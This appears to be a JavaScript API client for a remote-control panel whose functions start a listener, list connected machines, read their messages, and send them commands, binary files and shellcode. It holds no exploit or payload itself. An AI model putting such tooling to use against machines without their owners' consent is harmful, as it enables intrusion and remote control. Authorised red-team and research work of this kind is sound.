// Base URL for the API endpoints
const API_BASE = 'http://localhost:8080';

// API service functions for communicating with the backend
const apiService = {
    // Starts the listener on the server
    async startListener() {
        // Send a POST request to /start-listener with an empty JSON body
        const result = await fetch(`${API_BASE}/start-listener`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({}) // empty payload
        });
        // Parse and return the JSON response
        return await result.json();
    },

    // Retrieves the list of connected clients from the server
    async getClients() {
        const result = await fetch(`${API_BASE}/get-clients`);
        return await result.json(); // parse JSON response
    },

    // Retrieves detailed information about a specific client by IP
    async getClientInfo(clientIP) {
        const result = await fetch(`${API_BASE}/get-client-info?client=${clientIP}`);
        return await result.json();
    },

    // Retrieves messages for a specific client by IP
    async getClientMessages(clientIP) {
        // NOTE: fetches the messages appended to client.Messages buffer in message_protocol::processClientMessage()
        const result = await fetch(`${API_BASE}/get-client-messages?client=${clientIP}`); 
        return await result.json();
    },

    // Sends a command to a specific client
    async sendCommand(client, command) {
        // POST request with client and command in JSON body
        const result = await fetch(`${API_BASE}/send-command`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ client, command })
        });
        return await result.json();
    },

    // TODO: My_Sends a command to a specific client
    async mySendCommand(client, command) {
        // POST request with client and command in JSON body
        const result = await fetch(`${API_BASE}/my-send-command`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ client, command })
        });
        return await result.json();
    },

    // Sends a binary file to a specific client
    async sendFile(client, file) {
        const formData = new FormData();
        formData.append('client', client);
        formData.append('binaryFile', file); // attach file to form data
        
        // POST request with form data (multipart/form-data)
        const result = await fetch(`${API_BASE}/send-binary`, {
            method: 'POST',
            body: formData
        });
        return await result.json();
    },

    // Sends a shellcode file to a specific client
    async sendShellcode(client, file) {
        const formData = new FormData();
        formData.append('client', client);
        formData.append('shellcodeFile', file); // attach shellcode file
        
        const result = await fetch(`${API_BASE}/send-shellcode`, {
            method: 'POST',
            body: formData
        });
        return await result.json();
    }
};

// Utility functions for formatting and status handling
const utils = {
    // Formats the last seen timestamp of a client
    formatLastSeen(lastSeen) {
        if (!lastSeen) return 'Unknown'; // return fallback if timestamp missing
        const date = new Date(lastSeen);
        return date.toLocaleString(); // return human-readable date/time
    },

    // Formats a message timestamp into a readable time string
    formatMessageTime(timestamp) {
        const date = new Date(timestamp);
        return date.toLocaleTimeString(); // return only time
    },

    // Determines a CSS class for a status string for styling
    getStatusClass(status) {
        if (!status) return ''; // empty status
        if (status.includes('✅') || status.includes('Listener started')) return 'success';
        if (status.includes('❌') || status.includes('Error')) return 'error';
        if (status.includes('⚠️') || status.includes('DANGER')) return 'warning';
        return ''; // default if none match
    }
};
